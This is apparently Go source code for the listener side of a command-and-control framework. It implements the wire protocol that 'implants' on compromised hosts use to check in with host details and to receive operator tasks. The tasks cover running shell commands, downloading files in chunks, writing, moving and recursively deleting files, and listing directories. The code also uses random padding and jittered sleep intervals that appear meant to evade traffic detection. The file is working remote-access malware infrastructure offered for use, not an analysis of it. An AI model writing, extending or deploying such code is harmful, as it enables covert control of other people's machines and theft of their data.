// Package litebeacon implements the lightweight C implant listener: a TLS
// endpoint that accepts TLV payloads sealed with a per-build AES-GCM key.
package litebeacon

import (
	"encoding/binary"
	"errors"
	"fmt"
)

// Wire TLV type codes — shared with implant/lite/main.c.
const (
	tlvBeaconID  byte = 0x01
	tlvTimestamp byte = 0x02
	tlvPad       byte = 0x0f
	tlvHostname  byte = 0x10
	tlvOS        byte = 0x11
	tlvArch      byte = 0x12
	tlvUsername  byte = 0x13
	tlvPID       byte = 0x14
	tlvExecRes   byte = 0x20
	tlvFileRes   byte = 0x30
	tlvDirRes    byte = 0x31
	tlvStatusRes byte = 0x32
	tlvNextHint  byte = 0x44
)

// Task types queued by the console.
const (
	TaskExec    byte = 0x40
	TaskRead    byte = 0x41
	TaskSleep   byte = 0x42
	TaskExit    byte = 0x43
	TaskListDir byte = 0x45 // 0x44 is the interval-hint TLV, so dir listing starts at 0x45
	TaskWrite   byte = 0x46
	TaskRm      byte = 0x47
	TaskMv      byte = 0x48
	TaskMkdir   byte = 0x49
)

const (
	fileChunkSize = 48 * 1000
	fileMaxSize   = 20 * 1024 * 1024
)

// Wire length field is u16; every emitted value must fit in it (at most 65535).
// File data is sent in FILE_CHUNK slices so a 20MB download stays inside that limit.

type tlv struct {
	Type  byte
	Value []byte
}

func encodeTLVs(items []tlv) []byte {
	size := 0
	for _, it := range items {
		size += 3 + len(it.Value)
	}
	buf := make([]byte, 0, size)
	var lenb [2]byte
	for _, it := range items {
		binary.LittleEndian.PutUint16(lenb[:], uint16(len(it.Value)))
		buf = append(buf, it.Type, lenb[0], lenb[1])
		buf = append(buf, it.Value...)
	}
	return buf
}

func decodeTLVs(data []byte) ([]tlv, error) {
	var items []tlv
	for len(data) > 0 {
		if len(data) < 3 {
			return nil, errors.New("truncated tlv header")
		}
		n := int(binary.LittleEndian.Uint16(data[1:3]))
		if len(data) < 3+n {
			return nil, errors.New("truncated tlv value")
		}
		items = append(items, tlv{Type: data[0], Value: data[3 : 3+n]})
		data = data[3+n:]
	}
	return items, nil
}

// BeaconInfo is the host snapshot sent on the first check-in.
type BeaconInfo struct {
	ID       string `json:"ID"`
	Hostname string `json:"Hostname"`
	OS       string `json:"OS"`
	Arch     string `json:"Arch"`
	Username string `json:"Username"`
	PID      uint32 `json:"PID"`
}

type ExecResult struct {
	TaskID uint32
	Exit   int32
	Output []byte
}

type FileResult struct {
	TaskID  uint32
	Err     uint8
	Offset  uint32
	Total   uint32
	Chunked bool
	Content []byte
}

// DirEntry is one row of a remote directory listing.
type DirEntry struct {
	Name    string
	IsDir   bool
	Size    uint64
	ModTime int64
}

// DirResult is the implant's answer to a TaskListDir.
type DirResult struct {
	TaskID    uint32
	Err       uint8
	Truncated bool
	Entries   []DirEntry
}

// StatusResult is the implant's ack for fs operations (write/rm/mv/mkdir).
type StatusResult struct {
	TaskID uint32
	Err    uint8
	Msg    string
}

type checkin struct {
	BeaconID string
	TS       uint64
	Info     *BeaconInfo // nil unless hello fields present
	Execs    []ExecResult
	Files    []FileResult
	Dirs     []DirResult
	Statuses []StatusResult
}

// Task is a queued console action, delivered on the next check-in.
type Task struct {
	ID          uint32
	Type        byte // TaskExec / TaskRead / TaskSleep / TaskExit / TaskListDir / TaskWrite / TaskRm / TaskMv / TaskMkdir
	Cmd         string
	Path        string
	Dst         string
	Offset      uint32
	Total       uint64
	ExpectSize  int64
	ExpectMTime int64
	Force       bool
	Recursive   bool
	Data        []byte // write chunk (TaskWrite only)
	TimeoutSec  uint16
	IntervalSec uint32
	JitterPct   uint8
}

// parseCheckin decodes a decrypted implant request payload.
func parseCheckin(plain []byte) (*checkin, error) {
	items, err := decodeTLVs(plain)
	if err != nil {
		return nil, err
	}
	ci := &checkin{}
	info := &BeaconInfo{}
	for _, it := range items {
		switch it.Type {
		case tlvBeaconID:
			ci.BeaconID = string(it.Value)
		case tlvTimestamp:
			if len(it.Value) != 8 {
				return nil, errors.New("bad timestamp")
			}
			ci.TS = binary.LittleEndian.Uint64(it.Value)
		case tlvHostname:
			info.Hostname = string(it.Value)
		case tlvOS:
			info.OS = string(it.Value)
		case tlvArch:
			info.Arch = string(it.Value)
		case tlvUsername:
			info.Username = string(it.Value)
		case tlvPID:
			if len(it.Value) != 4 {
				return nil, errors.New("bad pid")
			}
			info.PID = binary.LittleEndian.Uint32(it.Value)
		case tlvExecRes:
			if len(it.Value) < 8 {
				return nil, errors.New("bad exec result")
			}
			ci.Execs = append(ci.Execs, ExecResult{
				TaskID: binary.LittleEndian.Uint32(it.Value[0:4]),
				Exit:   int32(binary.LittleEndian.Uint32(it.Value[4:8])),
				Output: cloneBytes(it.Value[8:]),
			})
		case tlvFileRes:
			if len(it.Value) < 13 {
				return nil, errors.New("bad file result")
			}
			ci.Files = append(ci.Files, FileResult{
				TaskID:  binary.LittleEndian.Uint32(it.Value[0:4]),
				Err:     it.Value[4],
				Chunked: true,
				Offset:  binary.LittleEndian.Uint32(it.Value[5:9]),
				Total:   binary.LittleEndian.Uint32(it.Value[9:13]),
				Content: cloneBytes(it.Value[13:]),
			})
		case tlvDirRes:
			dr, err := parseDirResult(it.Value)
			if err != nil {
				return nil, err
			}
			ci.Dirs = append(ci.Dirs, dr)
		case tlvStatusRes:
			if len(it.Value) < 7 {
				return nil, errors.New("bad status result")
			}
			mlen := int(binary.LittleEndian.Uint16(it.Value[5:7]))
			if len(it.Value) < 7+mlen {
				return nil, errors.New("bad status result")
			}
			ci.Statuses = append(ci.Statuses, StatusResult{
				TaskID: binary.LittleEndian.Uint32(it.Value[0:4]),
				Err:    it.Value[4],
				Msg:    string(it.Value[7 : 7+mlen]),
			})
		case tlvPad:
			// padding, ignored
		default:
			// unknown types are ignored for forward compatibility
		}
	}
	if ci.BeaconID == "" || ci.TS == 0 {
		return nil, errors.New("missing beacon id or timestamp")
	}
	if info.Hostname != "" || info.OS != "" || info.Arch != "" || info.Username != "" || info.PID != 0 {
		ci.Info = info
	}
	return ci, nil
}

// buildTaskPayload encodes pending tasks plus a random padding TLV.
func buildTaskPayload(tasks []Task, padLen int) ([]byte, error) {
	items := make([]tlv, 0, len(tasks)+1)
	for _, t := range tasks {
		value := make([]byte, 0, 10+len(t.Cmd)+len(t.Path))
		switch t.Type {
		case TaskExec:
			// Wire layout must match implant/lite/main.c run_tasks():
			// [task_id:4][timeout:2][cmd]. Only exec/read carry the task
			// ID — sleep/exit produce no result, so no ID on the wire.
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = binary.LittleEndian.AppendUint16(value, t.TimeoutSec)
			value = append(value, t.Cmd...)
		case TaskRead:
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = binary.LittleEndian.AppendUint32(value, t.Offset)
			value = append(value, t.Path...)
		case TaskListDir:
			// Wire layout must match implant/lite/main.c run_tasks():
			// [task_id:4][path]
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = append(value, t.Path...)
		case TaskWrite:
			// [task_id:4][offset:4][total:8][expectSize:8][expectMtime:8][force:1][pathLen:2][path][chunk]
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = binary.LittleEndian.AppendUint32(value, t.Offset)
			value = binary.LittleEndian.AppendUint64(value, t.Total)
			value = binary.LittleEndian.AppendUint64(value, uint64(t.ExpectSize))
			value = binary.LittleEndian.AppendUint64(value, uint64(t.ExpectMTime))
			value = append(value, 0)
			if t.Force {
				value[len(value)-1] = 1
			}
			value = binary.LittleEndian.AppendUint16(value, uint16(len(t.Path)))
			value = append(value, t.Path...)
			value = append(value, t.Data...)
		case TaskRm:
			// [task_id:4][recursive:1][path]
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = append(value, 0)
			if t.Recursive {
				value[len(value)-1] = 1
			}
			value = append(value, t.Path...)
		case TaskMv:
			// [task_id:4][srcLen:2][src][dst]
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = binary.LittleEndian.AppendUint16(value, uint16(len(t.Path)))
			value = append(value, t.Path...)
			value = append(value, t.Dst...)
		case TaskMkdir:
			// [task_id:4][path]
			value = binary.LittleEndian.AppendUint32(value, t.ID)
			value = append(value, t.Path...)
		case TaskSleep:
			value = binary.LittleEndian.AppendUint32(value, t.IntervalSec)
			value = append(value, t.JitterPct)
		case TaskExit:
		default:
			return nil, fmt.Errorf("unknown task type %#x", t.Type)
		}
		if len(value) > 0xFFFF {
			return nil, fmt.Errorf("task %#x value exceeds u16 tlv length", t.Type)
		}
		items = append(items, tlv{Type: t.Type, Value: value})
	}
	if padLen > 0 {
		items = append(items, tlv{Type: tlvPad, Value: randomBytes(padLen)})
	}
	return encodeTLVs(items), nil
}

func cloneBytes(b []byte) []byte {
	out := make([]byte, len(b))
	copy(out, b)
	return out
}

// parseDirResult decodes TLV_DIR_RES: [task_id:4][err:1][truncated:1][entries...],
// entries are [isdir:1][size:8][mtime:8][namelen:2][name], all little-endian.
func parseDirResult(value []byte) (DirResult, error) {
	var dr DirResult
	if len(value) < 6 {
		return dr, errors.New("bad dir result")
	}
	dr.TaskID = binary.LittleEndian.Uint32(value[0:4])
	dr.Err = value[4]
	dr.Truncated = value[5] != 0
	rest := value[6:]
	for len(rest) >= 19 {
		n := int(binary.LittleEndian.Uint16(rest[17:19]))
		if len(rest) < 19+n {
			break // 截断的尾部条目直接丢掉，不能错位解析
		}
		dr.Entries = append(dr.Entries, DirEntry{
			Name:    string(rest[19 : 19+n]),
			IsDir:   rest[0] != 0,
			Size:    binary.LittleEndian.Uint64(rest[1:9]),
			ModTime: int64(binary.LittleEndian.Uint64(rest[9:17])),
		})
		rest = rest[19+n:]
	}
	return dr, nil
}

// buildCheckinResponse appends the adaptive-interval hint (0x44) and the size
// pad to the encoded task TLVs. nextIntervalSec is the sleep base; 0 means
// "keep current". exact tells the implant to sleep that many seconds with no
// jitter (operator is working). Idle hints leave exact false so the implant
// multiplies by uniform(0.5, 3).
func buildCheckinResponse(taskPayload []byte, nextIntervalSec uint32, exact bool, padLen int) []byte {
	hint := binary.LittleEndian.AppendUint32(nil, nextIntervalSec)
	flag := byte(0)
	if exact {
		flag = 1
	}
	hint = append(hint, flag)
	items := []tlv{
		{Type: tlvNextHint, Value: hint},
		{Type: tlvPad, Value: randomBytes(padLen)},
	}
	return append(taskPayload, encodeTLVs(items)...)
}
